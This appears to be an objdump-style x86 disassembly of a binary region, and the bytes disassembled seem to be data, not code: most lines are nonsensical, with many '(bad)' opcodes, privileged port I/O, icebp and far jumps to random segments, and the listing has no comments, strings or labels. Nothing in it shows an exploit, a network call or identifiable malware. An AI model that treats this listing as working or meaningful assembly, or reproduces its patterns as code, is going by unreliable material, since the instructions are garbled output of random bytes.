  42ee70:	out    0x91,eax
  42ee72:	add    ecx,eax
  42ee74:	sub    BYTE PTR [ebx+edx*8-0x69d3298],ah
  42ee7b:	mov    bl,BYTE PTR [esi+0x355528fb]
  42ee81:	mov    ecx,0xd5998636
  42ee86:	sti    
  42ee87:	sbb    dh,dl
  42ee89:	icebp  
  42ee8a:	cmp    BYTE PTR [edi+ebx*2+0xdd9f7d],cl
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	(bad)  
  42ef01:	out    dx,eax
  42ef02:	mov    ah,0xd6
  42ef04:	pop    esp
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	cmp    DWORD PTR [edi],esi
  42ef0e:	mov    edi,0x2460b3fb
  42ef13:	jl     0x42ef07
  42ef15:	push   ecx
  42ef16:	stc    
  42ef17:	and    dl,BYTE PTR [edi]
  42ef19:	mov    ah,0x8f
  42ef1b:	push   eax
  42ef1c:	pop    ss
  42ef1d:	and    al,0x60
  42ef1f:	sbb    al,0x59
  42ef21:	jle    0x42eeae
  42ef23:	cmp    DWORD PTR [ecx+0xb1fc064],ebp
  42ef29:	(bad)  
  42ef2a:	fcomp  DWORD PTR [edx+0x6a78f180]
  42ef30:	jne    0x42efa9
  42ef32:	sub    edi,DWORD PTR [ebx]
  42ef34:	das    
  42ef35:	pop    edx
  42ef36:	mov    cl,0x7f
  42ef38:	or     BYTE PTR [ecx+eax*1-0xe],cl
  42ef3c:	sbb    ebx,DWORD PTR [ecx+0x5191f1df]
  42ef42:	loopne 0x42ef6e
  42ef44:	in     al,0xce
  42ef46:	jbe    0x42ef5f
  42ef48:	jo     0x42efb7
  42ef4a:	dec    ecx
  42ef4b:	rcl    ah,1
  42ef4d:	mov    edx,0x91f8de57
  42ef52:	xchg   edi,eax
  42ef53:	and    eax,0x1be09c3f
  42ef58:	jns    0x42efd2
  42ef5a:	lods   al,BYTE PTR ds:[esi]
  42ef5b:	nop
  42ef5c:	das    
  42ef5d:	mov    ds:0xb88b5d73,eax
  42ef62:	loopne 0x42eee5
  42ef64:	inc    esi
  42ef65:	mov    ah,0x59
  42ef67:	inc    ecx
  42ef68:	cmp    eax,DWORD PTR [eax]
  42ef6a:	in     eax,dx
  42ef6b:	jb     0x42eeef
  42ef6d:	pop    esi
  42ef6e:	push   ds
  42ef6f:	cmp    dh,BYTE PTR [ebp+0x4204e97]
  42ef75:	sub    al,0xcf
  42ef77:	jne    0x42efd4
  42ef79:	sub    al,bh
  42ef7b:	pop    ecx
  42ef7c:	(bad)  
  42ef7d:	data16 mov dl,0x2
  42ef80:	add    esi,DWORD PTR [eax-0x5c988110]
  42ef86:	aaa    
  42ef87:	mov    al,0xf4
  42ef89:	idiv   DWORD PTR [ecx]
  42ef8b:	inc    edx
  42ef8c:	adc    BYTE PTR [edx+0x17ce5104],0x4c
  42ef93:	adc    bl,bh
  42ef95:	xchg   edi,eax
  42ef96:	mov    eax,0x77f607c2
  42ef9b:	cs jmp 0xbaa8:0x9d06691
  42efa3:	pop    edx
  42efa4:	pop    ebp
  42efa5:	call   0x9b81:0x9a6a1778
  42efac:	pop    edx
  42efad:	push   ds
  42efae:	pop    edx
  42efaf:	mov    ds:0x459feb40,al
  42efb4:	xor    bl,bl
  42efb6:	out    dx,eax
  42efb7:	in     eax,0xb9
  42efb9:	les    edi,FWORD PTR [edx]
  42efbb:	pop    ecx
  42efbc:	pop    ebp
  42efbd:	jle    0x42efd4
  42efbf:	mov    al,0x5b
  42efc1:	test   al,0x3
  42efc3:	and    BYTE PTR [ebp-0x73],0x2d
  42efc7:	std    
  42efc8:	cli    
  42efc9:	lock test eax,0x284ccd0e
  42efcf:	les    edi,FWORD PTR [ebx-0x6a4ef8d2]
  42efd5:	and    esp,edi
  42efd7:	test   al,0x1c
  42efd9:	dec    edi
  42efda:	and    edi,eax
  42efdc:	mov    al,ds:0xb0d2bb6
  42efe1:	inc    esp
  42efe2:	sub    bh,BYTE PTR [edi-0x73]
  42efe5:	mov    ds:0x648259bd,al
  42efea:	xchg   esi,eax
  42efeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efec:	outs   dx,DWORD PTR ds:[esi]
  42efed:	xchg   esi,eax
  42efee:	cmp    al,0x37
  42eff0:	stos   BYTE PTR es:[edi],al
  42eff1:	add    al,0x34
  42eff3:	xor    cl,BYTE PTR cs:[edx+0x34]
  42eff7:	or     al,0xa9
  42eff9:	(bad)  
  42effa:	add    BYTE PTR ss:[edx+0x2c],cl
  42effe:	and    BYTE PTR [ebx-0x13],ch
  42f001:	lods   eax,DWORD PTR ds:[esi]
  42f002:	sbb    al,0xb1
  42f004:	outs   dx,BYTE PTR ds:[esi]
  42f005:	or     DWORD PTR [ecx+edx*4-0x3b],0xd
  42f00a:	mov    ecx,0x34b77a49
  42f00f:	mov    dh,0x0
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	pop    edx
  42f081:	scas   al,BYTE PTR es:[edi]
  42f082:	daa    
  42f083:	daa    
  42f084:	pusha  
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [ebp+0x2a],bl
  42f08e:	adc    eax,0x5fa0e53
  42f093:	inc    edi
  42f094:	repz mov edi,DWORD PTR [ebx]
  42f097:	and    BYTE PTR [edi-0x6e],al
  42f09a:	pop    esi
  42f09b:	or     DWORD PTR [ebx+0x5d],edx
  42f09e:	xor    DWORD PTR [eax-0x6a],esp
  42f0a1:	(bad)  [esi]
  42f0a3:	ror    BYTE PTR [edi+ebx*1-0x5adbe522],1
  42f0aa:	sub    eax,0x86f783bd
  42f0af:	mov    ecx,0xee378e2c
  42f0b4:	retf   0x761b
  42f0b7:	push   0xffffff98
  42f0b9:	sub    ebp,DWORD PTR [edi+0xc]
  42f0bc:	loop   0x42f0a1
  42f0be:	test   al,0x37
  42f0c0:	inc    edi
  42f0c1:	call   DWORD PTR [edx+0x64196ea8]
  42f0c7:	push   0x8b3640fe
  42f0cc:	shl    BYTE PTR [edi+0x3a],cl
  42f0cf:	scas   eax,DWORD PTR es:[edi]
  42f0d0:	or     eax,0x2d9f2b8c
  42f0d5:	in     eax,dx
  42f0d6:	xchg   esi,eax
  42f0d7:	mov    cl,0xe4
  42f0d9:	mov    bh,0x44
  42f0db:	iret   
  42f0dc:	push   cs
  42f0dd:	jmp    0xbd8a:0xa5e8725
  42f0e4:	mov    ds:0xa42dd8ac,al
  42f0e9:	and    BYTE PTR [edx-0x4a],dl
  42f0ec:	cmp    eax,0x361ed2f3
  42f0f1:	xchg   ecx,eax
  42f0f2:	retf   0x5771
  42f0f5:	jo     0x42f154
  42f0f7:	gs xchg edi,eax
  42f0f9:	xchg   BYTE PTR [esi-0x3be0cea5],bh
  42f0ff:	iret   
  42f100:	aaa    
  42f101:	idiv   BYTE PTR [eax+ecx*2]
  42f104:	sub    BYTE PTR [edi-0x16c1436e],0x8e
  42f10b:	push   ebx
  42f10c:	push   eax
  42f10d:	adc    DWORD PTR [ebp+0x5],0x1865da82
  42f114:	out    dx,al
  42f115:	sbb    eax,0x1d4c1591
  42f11a:	sahf   
  42f11b:	sbb    dh,BYTE PTR [ebx]
  42f11d:	icebp  
  42f11e:	sti    
  42f11f:	mov    al,0x63
  42f121:	push   esp
  42f122:	cmp    al,0xb6
  42f124:	aaa    
  42f125:	and    eax,0x255c05e0
  42f12a:	push   esp
  42f12b:	popa   
  42f12c:	add    bl,BYTE PTR [ebx-0x44cbac85]
  42f132:	(bad)  
  42f133:	jecxz  0x42f18b
  42f135:	cmp    al,bh
  42f137:	adc    al,0xa9
  42f139:	das    
  42f13a:	or     DWORD PTR [edx-0x7a20dd0d],0xfffffff2
  42f141:	dec    ebx
  42f142:	clc    
  42f143:	push   ebp
  42f144:	mov    cl,0x70
  42f146:	xchg   ebx,eax
  42f147:	jbe    0x42f0de
  42f149:	icebp  
  42f14a:	mov    dl,0x5a
  42f14c:	aas    
  42f14d:	sub    DWORD PTR [ebp+0x29],0x33
  42f151:	push   0x41
  42f153:	pop    esi
  42f154:	nop
  42f155:	mov    bl,BYTE PTR [edi-0x39717095]
  42f15b:	push   eax
  42f15c:	add    dl,bl
  42f15e:	push   ecx
  42f15f:	sti    
  42f160:	add    al,0x10
  42f162:	inc    edi
  42f163:	ds jg  0x42f144
  42f166:	xchg   ebp,eax
  42f167:	pop    ecx
  42f168:	cwde   
  42f169:	push   edi
  42f16a:	inc    ebp
  42f16b:	xchg   ebp,eax
  42f16c:	test   eax,0x5cd9f065
  42f171:	inc    edi
  42f172:	xor    BYTE PTR [eax],bl
  42f174:	retf   0xea63
  42f177:	xor    al,bh
  42f179:	sti    
  42f17a:	pop    edi
  42f17b:	retf   0x852a
  42f17e:	jae    0x42f1c6
  42f180:	loopne 0x42f105
  42f182:	sbb    ebp,DWORD PTR [ebp+0x1a]
  42f185:	push   edx
  42f186:	fwait
  42f187:	idiv   BYTE PTR [esi]
  42f189:	es into 
  42f18b:	cmp    cl,BYTE PTR [edx+edx*4+0xcd3a]
	...
  42f1f2:	add    BYTE PTR [eax],al
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	dec    ecx
  42f201:	push   esp
  42f202:	adc    DWORD PTR [eax+0x64],0xfffffff8
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	xchg   edi,eax
  42f20d:	and    esp,DWORD PTR [eax]
  42f20f:	add    DWORD PTR [ecx],esi
  42f211:	fisttp QWORD PTR [ebp-0x78]
  42f214:	cmp    DWORD PTR [edi],0xad27d655
  42f21a:	adc    edx,DWORD PTR [edi]
  42f21c:	das    
  42f21d:	out    0x16,eax
  42f21f:	in     al,0x79
  42f221:	rol    cl,1
  42f223:	sub    al,0x3
  42f225:	xor    eax,0x23883507
  42f22a:	ins    DWORD PTR es:[edi],dx
  42f22b:	mov    eax,0x22c03813
  42f230:	je     0x42f205
  42f232:	mov    al,ds:0x2f75243
  42f237:	js     0x42f1ce
  42f239:	dec    edx
  42f23a:	ja     0x42f25b
  42f23c:	push   eax
  42f23d:	fld    QWORD PTR [ebx]
  42f23f:	aam    0x48
  42f241:	cmp    BYTE PTR [esi+0x58411d4e],0xa9
  42f248:	mov    esp,0xa6c7053d
  42f24d:	fadd   DWORD PTR [esi+0x453ed3ad]
  42f253:	inc    eax
  42f254:	sub    dl,BYTE PTR [ebp+eiz*8-0x53]
  42f258:	sbb    DWORD PTR ds:0x82ccff0,ebp
  42f25e:	arpl   WORD PTR [ebx-0x6f],bp
  42f261:	mov    esp,0xb367e1f3
  42f266:	out    0x95,eax
  42f268:	xchg   ebx,eax
  42f269:	and    al,0xba
  42f26b:	dec    eax
  42f26c:	push   ebx
  42f26d:	sbb    ebp,eax
  42f26f:	retf   0xd1b0
  42f272:	and    ebp,DWORD PTR [ecx-0x80]
  42f275:	arpl   WORD PTR [ebx+0x7e],cx
  42f278:	inc    edi
  42f279:	dec    esi
  42f27a:	clc    
  42f27b:	mov    eax,edx
  42f27d:	ds push esi
  42f27f:	and    eax,0xe80ab715
  42f284:	jmp    0x42f2d0
  42f286:	inc    ecx
  42f287:	(bad)  
  42f289:	lds    esp,FWORD PTR [ebp-0x50]
  42f28c:	and    al,0x80
  42f28e:	call   0xc37f0955
  42f293:	call   0xf8c4:0xb396d172
  42f29a:	fs jo  0x42f2d4
  42f29d:	js     0x42f31d
  42f29f:	cld    
  42f2a0:	cli    
  42f2a1:	push   ebx
  42f2a2:	add    ch,BYTE PTR [edi+ebx*4+0x4e8f5f7d]
  42f2a9:	ds push esp
  42f2ab:	sub    DWORD PTR [ecx],0x5d0c0e88
  42f2b1:	cwde   
  42f2b2:	cwde   
  42f2b3:	mov    ebx,DWORD PTR fs:[ebx-0x447471bc]
  42f2ba:	sbb    ah,BYTE PTR [ebp+0x40]
  42f2bd:	(bad)  
  42f2bf:	out    dx,eax
  42f2c0:	mov    ebx,0xe6191fa7
  42f2c5:	(bad)  
  42f2c6:	push   ebp
  42f2c7:	jmp    0x42f325
  42f2c9:	fcom   QWORD PTR [ecx+0xec122b3]
  42f2cf:	das    
  42f2d0:	dec    DWORD PTR [ebx+edi*1-0x74]
  42f2d4:	jns    0x42f333
  42f2d6:	les    ecx,FWORD PTR [ebx-0x65]
  42f2d9:	xchg   BYTE PTR [ebx+0x6a71172f],bl
  42f2df:	mov    dh,0x8d
  42f2e1:	push   edi
  42f2e2:	neg    BYTE PTR [ecx]
  42f2e4:	xchg   esp,eax
  42f2e5:	test   DWORD PTR [ebp+0x2f],ebp
  42f2e8:	xchg   edi,eax
  42f2e9:	leave  
  42f2ea:	ret    
  42f2eb:	lds    ebp,FWORD PTR [ecx+ebp*2]
  42f2ee:	(bad)  
  42f2ef:	jge    0x42f2e5
  42f2f1:	adc    eax,DWORD PTR [edi-0x41a589ec]
  42f2f7:	cmp    edx,DWORD PTR [ebx-0x1f957b99]
  42f2fd:	aaa    
  42f2fe:	jg     0x42f36d
  42f300:	in     al,0xe9
  42f302:	push   esi
  42f303:	or     dl,BYTE PTR [ebp+0x28]
  42f306:	ds mov ebx,0x74443d2a
  42f30c:	jl     0x42f2d4
  42f30e:	push   edi
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	(bad)  [ebx]
  42f382:	pusha  
  42f383:	push   0x1f968
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	lahf   
  42f38d:	jbe    0x42f36e
  42f38f:	mov    edi,0xc6a2247c
  42f394:	cld    
  42f395:	test   DWORD PTR [eax-0x1a2aa722],esi
  42f39b:	js     0x42f332
  42f39d:	fnstsw WORD PTR [ebx-0x24]
  42f3a0:	shl    bl,cl
  42f3a2:	dec    ebp
  42f3a3:	pop    ds
  42f3a4:	mov    ds:0x24425833,eax
  42f3a9:	cmp    DWORD PTR [edi],edi
  42f3ab:	jb     0x42f3d4
  42f3ad:	mov    ds:0x18e36dd9,eax
  42f3b2:	mov    ds:0xb14aeb50,al
  42f3b7:	jmp    0x42f437
  42f3b9:	pop    edx
  42f3ba:	mov    esi,0x7dbce5dd
  42f3bf:	pushf  
  42f3c0:	pop    ds
  42f3c1:	leave  
  42f3c2:	mov    al,ds:0xf9ea0d73
  42f3c7:	push   ss
  42f3c8:	mov    bh,BYTE PTR [ecx]
  42f3ca:	sbb    al,0x77
  42f3cc:	xchg   esp,eax
  42f3cd:	sub    eax,0x2fed900a
  42f3d2:	call   0xce1d:0x80379250
  42f3d9:	dec    esp
  42f3da:	into   
  42f3db:	iret   
  42f3dc:	push   ecx
  42f3dd:	pop    ss
  42f3de:	push   ebx
  42f3df:	lods   al,BYTE PTR ds:[esi]
  42f3e0:	into   
  42f3e1:	pop    ebp
  42f3e2:	cmp    eax,esp
  42f3e4:	xchg   ebx,eax
  42f3e5:	ret    
  42f3e6:	adc    DWORD PTR [eax],0x21
  42f3e9:	out    0x2a,al
  42f3eb:	lods   eax,DWORD PTR ds:[esi]
  42f3ec:	outs   dx,DWORD PTR ds:[esi]
  42f3ed:	pop    es
  42f3ee:	sub    ebx,DWORD PTR [ebx]
  42f3f0:	call   0x9e61:0x12799460
  42f3f7:	sahf   
  42f3f8:	sahf   
  42f3f9:	mov    dl,0xbc
  42f3fb:	add    ecx,DWORD PTR [edx+0x74]
  42f3fe:	popf   
  42f3ff:	stos   BYTE PTR es:[edi],al
  42f400:	xchg   esi,eax
  42f401:	push   ax
  42f403:	sbb    eax,0x9909fe8
  42f408:	jl     0x42f42f
  42f40a:	mov    dh,0xf9
  42f40c:	inc    edi
  42f40d:	shr    DWORD PTR [edi+0x40],0x8
  42f411:	mov    esp,0xaeba44cc
  42f416:	sub    DWORD PTR [eax],esp
  42f418:	xchg   ecx,eax
  42f419:	push   cs
  42f41a:	xlat   BYTE PTR ds:[ebx]
  42f41b:	es xchg esi,eax
  42f41d:	aad    0xcd
  42f41f:	inc    eax
  42f420:	pushf  
  42f421:	mov    esi,DWORD PTR [edi+0x2db452a0]
  42f427:	push   cs
  42f428:	mov    ds:0x62d15e4e,eax
  42f42d:	mov    ch,BYTE PTR [edx-0x6a97e0a6]
  42f433:	or     ecx,DWORD PTR [esp+eiz*8+0x50]
  42f437:	mov    ebx,0x35eeee11
  42f43c:	ins    DWORD PTR es:[edi],dx
  42f43d:	aas    
  42f43e:	mov    DWORD PTR es:[eax+edi*8+0x20],esi
  42f443:	stc    
  42f444:	xchg   ebp,eax
  42f445:	lock pop ss
  42f447:	jmp    0x42f400
  42f449:	(bad)  
  42f44a:	pop    esi
  42f44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f44c:	aas    
  42f44d:	and    DWORD PTR [esi+0x69],eax
  42f450:	cmp    BYTE PTR [edi+0x38],bh
  42f453:	ja     0x42f4ad
  42f455:	out    0x16,eax
  42f457:	retf   
  42f458:	push   0x81c3ac3e
  42f45d:	cld    
  42f45e:	sti    
  42f45f:	or     bl,BYTE PTR [edx]
  42f461:	outs   dx,BYTE PTR ds:[esi]
  42f462:	test   al,0xc5
  42f464:	push   ss
  42f465:	lods   eax,DWORD PTR ds:[esi]
  42f466:	daa    
  42f467:	pop    es
  42f468:	into   
  42f469:	in     eax,dx
  42f46a:	sbb    BYTE PTR [esi+0x5d8a4fca],cl
  42f470:	xor    DWORD PTR [eax+0x1971eec7],esp
  42f476:	mov    eax,ds:0xcbf5b607
  42f47b:	sbb    DWORD PTR [esi+0x58],0xffffffdc
  42f47f:	(bad)
  42f482:	cmp    ebp,DWORD PTR [eax+ebx*2+0x7]
  42f486:	pop    edx
  42f487:	pop    ebx
  42f488:	fsub   QWORD PTR [esi-0x1df2e218]
  42f48e:	popa   
  42f48f:	sub    al,BYTE PTR [eax]
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	shl    BYTE PTR [eax-0x1b],0x49
  42f504:	ins    BYTE PTR es:[edi],dx
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f50d:	enter  0x1076,0x8b
  42f511:	(bad)  
  42f512:	push   cs
  42f513:	rcl    BYTE PTR [eax+0x25ccd378],0xe1
  42f51a:	call   0x99e4fed2
  42f51f:	or     DWORD PTR [esi],ebp
  42f521:	add    esi,0xffffffcc
  42f524:	jle    0x42f527
  42f526:	icebp  
  42f527:	test   BYTE PTR [ebx+0x1e5f6005],al
  42f52d:	cdq    
  42f52e:	mov    esi,0xa6fd553c
  42f533:	add    dh,BYTE PTR [esi]
  42f535:	mov    esi,0x58527586
  42f53a:	jp     0x42f536
  42f53c:	adc    BYTE PTR [edi+0x0],ah
  42f53f:	or     BYTE PTR [esp+esi*4+0x1a],al
  42f543:	int3   
  42f544:	pop    ebx
  42f545:	mov    bl,0x4a
  42f547:	inc    esp
  42f548:	fist   WORD PTR [eax+0x19cc54ca]
  42f54e:	sub    DWORD PTR [eax+0x5c],0xffffff96
  42f552:	jb     0x42f560
  42f554:	mov    DWORD PTR [ebp+ebp*2-0xc9b0982],0xce2c2745
  42f55f:	pop    es
  42f560:	int3   
  42f561:	fisub  DWORD PTR [edi]
  42f563:	arpl   dx,dx
  42f565:	out    dx,al
  42f566:	mov    eax,ds:0xcdaf459f
  42f56b:	push   edx
  42f56c:	cmc    
  42f56d:	pusha  
  42f56e:	mov    cl,BYTE PTR gs:[esi+0x6]
  42f572:	mov    dl,0x65
  42f574:	int    0xf4
  42f576:	jl     0x42f599
  42f578:	out    dx,al
  42f579:	arpl   WORD PTR [esi-0x2ffb1473],bx
  42f57f:	js     0x42f5fc
  42f581:	add    ch,cl
  42f583:	nop
  42f584:	jbe    0x42f605
  42f586:	mov    bl,0x5e
  42f588:	xor    eax,0x7c4cc430
  42f58e:	fs dec esi
  42f590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f591:	lods   eax,DWORD PTR ds:[esi]
  42f592:	adc    BYTE PTR [ebp+esi*8-0x23],dh
  42f596:	dec    ecx
  42f597:	xor    DWORD PTR [edi+0x34],eax
  42f59a:	pushf  
  42f59b:	push   bx
  42f59d:	push   edx
  42f59e:	mov    bl,0xe6
  42f5a0:	daa    
  42f5a1:	adc    esp,DWORD PTR [edi-0x2fd8cd8e]
  42f5a7:	sub    al,BYTE PTR [ebp-0x2a79b169]
  42f5ad:	popf   
  42f5ae:	clc    
  42f5af:	inc    edi
  42f5b0:	iret   
  42f5b1:	inc    ecx
  42f5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5b3:	xchg   edi,eax
  42f5b4:	retf   
  42f5b5:	pop    ecx
  42f5b6:	sbb    eax,0xdc252d2a
  42f5bb:	add    BYTE PTR [eax+eax*8+0x69189c11],al
  42f5c2:	stos   BYTE PTR es:[edi],al
  42f5c3:	mov    eax,ds:0xaddc71b7
  42f5c8:	into   
  42f5c9:	arpl   WORD PTR ds:0x7bf119e9,ax
  42f5cf:	out    0xb5,al
  42f5d1:	adc    DWORD PTR [ecx],edi
  42f5d3:	adc    dl,BYTE PTR [esi-0x36f140a6]
  42f5d9:	adc    ebp,ecx
  42f5db:	pop    edx
  42f5dc:	jns    0x42f586
  42f5de:	pop    es
  42f5df:	in     al,0x5f
  42f5e1:	fiadd  WORD PTR [esi]
  42f5e3:	(bad)  
  42f5e4:	mov    ch,0x18
  42f5e6:	mov    esi,0x22f346d1
  42f5eb:	or     DWORD PTR [ebx-0x4094a330],0x42235171
  42f5f5:	xchg   ecx,eax
  42f5f6:	xchg   DWORD PTR [esi+0xd],edx
  42f5f9:	add    DWORD PTR [edi+edx*2+0x41],0xffffff80
  42f5fe:	dec    esi
  42f5ff:	mov    cl,BYTE PTR [ecx+0x371b256]
  42f605:	aad    0xe
  42f607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f608:	aam    0x8c
  42f60a:	ret    
  42f60b:	bound  edx,QWORD PTR ds:0x8a2a9e
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	xchg   esp,eax
  42f681:	es cmc 
  42f683:	mov    ds:0x1fb70,eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	push   eax
  42f68d:	das    
  42f68e:	mov    al,0x17
  42f690:	imul   BYTE PTR [esi+0x37]
  42f693:	jmp    0x866459ed
  42f698:	push   edx
  42f699:	or     dh,BYTE PTR [edi-0x79]
  42f69c:	xchg   edi,eax
  42f69d:	arpl   ax,si
  42f69f:	cmp    DWORD PTR [ecx],eax
  42f6a1:	jb     0x42f69d
  42f6a3:	push   0xffffffbc
  42f6a5:	dec    ebp
  42f6a6:	adc    eax,0x3ed82cee
  42f6ab:	shl    DWORD PTR [esi+0x3c],0x44
  42f6af:	das    
  42f6b0:	jbe    0x42f69c
  42f6b2:	hlt    
  42f6b3:	or     bh,BYTE PTR ds:0x631a36a9
  42f6b9:	stos   DWORD PTR es:[edi],eax
  42f6ba:	xchg   ebx,eax
  42f6bb:	faddp  st(6),st
  42f6bd:	shr    DWORD PTR [ecx+ecx*1+0x47],0x35
  42f6c2:	jnp    0x42f65a
  42f6c4:	je     0x42f72c
  42f6c6:	js     0x42f69c
  42f6c8:	sub    edi,DWORD PTR [edi+0x49606c37]
  42f6ce:	pusha  
  42f6cf:	xor    bh,cl
  42f6d1:	rcr    DWORD PTR [ecx+0x3b],cl
  42f6d4:	push   es
  42f6d5:	in     al,dx
  42f6d6:	call   0xe3f9:0xac999f2
  42f6dd:	ret    
  42f6de:	or     ebp,DWORD PTR [ebx+0x55]
  42f6e1:	xlat   BYTE PTR ds:[ebx]
  42f6e2:	dec    eax
  42f6e3:	(bad)  
  42f6e4:	fcmovbe st,st(3)
  42f6e6:	sbb    eax,DWORD PTR [ecx]
  42f6e8:	call   0xf1515e3b
  42f6ed:	dec    edi
  42f6ee:	xchg   ecx,eax
  42f6ef:	dec    esp
  42f6f0:	enter  0x57f6,0xda
  42f6f4:	rol    BYTE PTR [edx+0x5b211340],cl
  42f6fa:	pop    ds
  42f6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6fc:	lock mov ch,0xd5
  42f6ff:	out    0x42,al
  42f701:	stos   BYTE PTR es:[edi],al
  42f702:	xor    esp,ebx
  42f704:	xor    BYTE PTR [edi],ah
  42f706:	lods   al,BYTE PTR ds:[si]
  42f708:	dec    ecx
  42f709:	mov    cl,0xac
  42f70b:	(bad)  
  42f70c:	cli    
  42f70d:	(bad)
  42f710:	push   ebp
  42f711:	retf   
  42f712:	xchg   ebx,eax
  42f713:	js     0x42f6c5
  42f715:	jmp    0x97df:0xfb8c42a
  42f71c:	(bad)  
  42f71d:	outs   dx,BYTE PTR ds:[esi]
  42f71e:	push   ss
  42f71f:	adc    dh,BYTE PTR [ebx-0xca3454]
  42f725:	and    BYTE PTR [edx+0x316a5bdc],dh
  42f72b:	add    eax,0x798ff78b
  42f730:	xchg   edx,eax
  42f731:	xlat   BYTE PTR ds:[ebx]
  42f732:	inc    edi
  42f733:	xchg   DWORD PTR [edx-0x3f02ee92],ecx
  42f739:	mov    ebp,0x26eca475
  42f73e:	and    ebp,DWORD PTR [edi*4+0x7f8d6f4c]
  42f745:	ja     0x42f743
  42f747:	xor    ch,BYTE PTR [ebx+0x31de4153]
  42f74d:	push   esp
  42f74e:	lds    eax,FWORD PTR [edi-0x49]
  42f751:	aam    0x8b
  42f753:	fimul  WORD PTR [ebp+0x79fa3b44]
  42f759:	sbb    DWORD PTR [ecx],eax
  42f75b:	lock mov ah,dl
  42f75e:	sub    al,0x26
  42f760:	das    
  42f761:	icebp  
  42f762:	cmovnp esi,DWORD PTR [ecx]
  42f765:	out    dx,al
  42f766:	inc    eax
  42f767:	jns    0x42f764
  42f769:	pop    es
  42f76a:	and    ecx,DWORD PTR fs:[edx-0x79]
  42f76e:	mov    al,ds:0x57674fd7
  42f773:	cmp    cl,BYTE PTR [ebx]
  42f775:	out    0xe0,al
  42f777:	jg     0x42f790
  42f779:	aaa    
  42f77a:	(bad)  
  42f77c:	adc    bl,dl
  42f77e:	cmp    al,0x83
  42f780:	add    BYTE PTR [ebx+0x278a32fd],al
  42f786:	out    dx,eax
  42f787:	push   0x76
  42f789:	jle    0x42f717
  42f78b:	daa    
  42f78c:	repnz into 
  42f78e:	jae    0x42f80d
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x925e1ea5
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	ss sbb al,0x31
  42f80f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f810:	sbb    esp,DWORD PTR [esi+eax*4-0x48]
  42f814:	rcr    DWORD PTR [esi+0x321837e5],0xca
  42f81b:	sbb    al,0x6a
  42f81d:	and    eax,0xd115e45a
  42f822:	loop   0x42f8a0
  42f824:	imul   esi,edi,0x8
  42f827:	rol    DWORD PTR [edi-0x75a29a31],cl
  42f82d:	xlat   BYTE PTR ds:[ebx]
  42f82e:	loopne 0x42f7d2
  42f830:	int3   
  42f831:	and    esp,DWORD PTR [eax-0x4f]
  42f834:	iret   
  42f835:	mov    ebp,0xb84a8f1a
  42f83a:	mov    bl,0xb7
  42f83c:	sbb    eax,0xf7413d39
  42f841:	and    eax,eax
  42f843:	adc    BYTE PTR [esi+0x14],cl
  42f846:	sub    bl,BYTE PTR ds:0x58ab1f63
  42f84c:	fmul   DWORD PTR ds:0x507adc21
  42f852:	stos   BYTE PTR es:[edi],al
  42f853:	mul    BYTE PTR [ecx]
  42f855:	sub    al,0x58
  42f857:	add    DWORD PTR [eax+0x3a],0x66
  42f85b:	and    al,0xc9
  42f85d:	test   al,0xfd
  42f85f:	mov    bh,0x84
  42f861:	push   ebx
  42f862:	lock rcr BYTE PTR [di-0x61ef],1
  42f868:	xchg   BYTE PTR [eax],cl
  42f86a:	test   BYTE PTR [ebx+0x20c1c022],dl
  42f870:	fs (bad) 
  42f872:	aas    
  42f873:	fistp  DWORD PTR [edi-0x58]
  42f876:	pusha  
  42f877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f878:	sar    ebp,cl
  42f87a:	lock cld 
  42f87c:	push   edx
  42f87d:	push   0xf4c2ecee
